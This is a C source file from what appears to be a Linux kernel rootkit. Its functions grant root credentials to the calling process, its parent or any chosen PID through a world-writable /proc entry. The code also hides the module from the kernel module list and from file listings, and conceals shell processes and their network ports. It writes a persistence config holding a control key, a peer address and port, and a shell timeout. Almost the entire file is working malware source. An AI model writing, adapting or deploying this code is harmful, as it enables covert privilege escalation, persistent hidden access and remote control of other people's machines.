// SPDX-License-Identifier: GPL-2.0
// core/opsec.c - Escalation, module cloaking, persistence, auto-opsec.
#include "rootkit.h"
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/hex.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>

int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	commit_creds(new_cred);

	// Also escalate parent so shell mkdir built-ins propagate.
	rk_escalate_pid(current->real_parent->pid);
	return 0;
}

int rk_escalate_pid(pid_t nr)
{
	struct task_struct *task;
	struct cred *new;

	new = prepare_kernel_cred(&init_task);
	if (!new)
		return -ENOMEM;

	rcu_read_lock();
	task = pid_task(find_vpid(nr), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		abort_creds(new);
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();

	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, get_cred(new));

	put_task_struct(task);
	return 0;
}

// Deferred PID-targeted escalation via /proc/rklings
static pid_t deferred_escalate_pid;
static struct proc_dir_entry *proc_entry;

void rk_set_escalate_pid(pid_t pid)
{
	deferred_escalate_pid = pid;
}

static int rk_proc_show(struct seq_file *m, void *v)
{
	pid_t target = deferred_escalate_pid;

	if (target && target == current->pid) {
		rk_escalate();
		deferred_escalate_pid = 0;
	}
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
    .proc_open = rk_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

int rk_proc_init(void)
{
	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry)
		return -ENOMEM;
	return 0;
}

void rk_proc_exit(void)
{
	proc_remove(proc_entry);
}

static struct list_head *saved_mod_list;

void rk_hide_module(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_unhide_module(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

void rk_cloak(void)
{
	rk_hide_module();
	rk_target_add(&rk_content_targets, MODULE_NAME_STR);
	rk_target_add(&rk_file_targets, MODULE_NAME_STR);
}

void rk_uncloak(void)
{
	rk_unhide_module();
	rk_target_remove_name(&rk_content_targets, MODULE_NAME_STR);
	rk_target_remove_name(&rk_file_targets, MODULE_NAME_STR);
}

bool rk_is_cloaked(void)
{
	return saved_mod_list != NULL;
}

int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;
	char line[256];
	char key_hex[RK_KEY_HEX_LEN + 1];
	int len;

	bin2hex(key_hex, rk_key, RK_KEY_LEN);
	key_hex[RK_KEY_HEX_LEN] = '\0';

	len = snprintf(line, sizeof(line),
		       MODULE_NAME_STR " control_key=%s"
				       " peer_address=%s"
				       " peer_port=%u"
				       " retry_base_ms=%u"
				       " retry_max_ms=%u"
				       " shell_timeout_ms=%u\n",
		       key_hex, peer_addr_str, peer_port, retry_base_ms,
		       retry_max_ms, shell_timeout_ms);

	memzero_explicit(key_hex, sizeof(key_hex));

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f)) {
		memzero_explicit(line, sizeof(line));
		return PTR_ERR(f);
	}
	kernel_write(f, line, len, &pos);
	filp_close(f, NULL);
	memzero_explicit(line, sizeof(line));
	return 0;
}

int rk_unpersist(void)
{
	struct path path;
	struct inode *dir;
	int error;

	error = kern_path(PERSIST_PATH, 0, &path);
	if (error)
		return error;
	dir = d_inode(path.dentry->d_parent);
	inode_lock(dir);
	error = vfs_unlink(&nop_mnt_idmap, dir, path.dentry, NULL);
	inode_unlock(dir);
	path_put(&path);
	return error;
}

bool rk_is_persisted(void)
{
	struct file *f;
	loff_t size;

	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
	if (IS_ERR(f))
		return false;
	size = i_size_read(file_inode(f));
	filp_close(f, NULL);
	return size > 0;
}

void rk_auto_hide(struct socket *sock)
{
	struct inet_sock *inet = inet_sk(sock->sk);
	char buf[8];

	snprintf(buf, sizeof(buf), "%d", current->pid);
	rk_target_add(&rk_pid_targets, buf);

	snprintf(buf, sizeof(buf), "%hu", ntohs(inet->inet_sport));
	rk_target_add(&rk_port_targets, buf);
}

void rk_auto_unhide(void)
{
	char buf[8];
	int i;

	snprintf(buf, sizeof(buf), "%d", current->pid);
	for (i = 0; i < rk_pid_targets.count; i++) {
		if (strcmp(rk_pid_targets.targets[i], buf) == 0) {
			rk_target_remove(&rk_pid_targets, i);
			break;
		}
	}

	if (rk_port_targets.count > 0)
		rk_target_remove(&rk_port_targets, rk_port_targets.count - 1);
}
